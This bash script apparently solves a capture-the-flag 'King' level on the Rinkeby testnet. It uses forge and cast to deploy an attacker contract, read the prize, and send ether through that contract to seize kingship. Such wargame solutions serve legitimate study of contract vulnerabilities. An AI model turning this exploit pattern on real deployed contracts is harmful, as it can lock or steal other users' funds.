#!/bin/bash

# Creating our malicious contract instance
forge create --rpc-url $RINKERBY --private-key $PRIVATE_KEY src/Contract.sol:ImposterKing --constructor-args $KING

# Finding the current prize amt so we know how much we need to overthrow the current king
cast call $KING --rpc-url $RINKERBY "prize()" | cast --to-dec | cast --to-uint gwei

# Changing our output to ether
cast --to-unit 1000000000000000wei ether

# Calling our malicious contract to become the new king
cast send 0x397da02514e7243758e5a45794f7f7901b8a6baf --rpc-url $RINKERBY --private-key $PRIVATE_KEY "claimCrown()" --value 0.0015ether --gas 80000
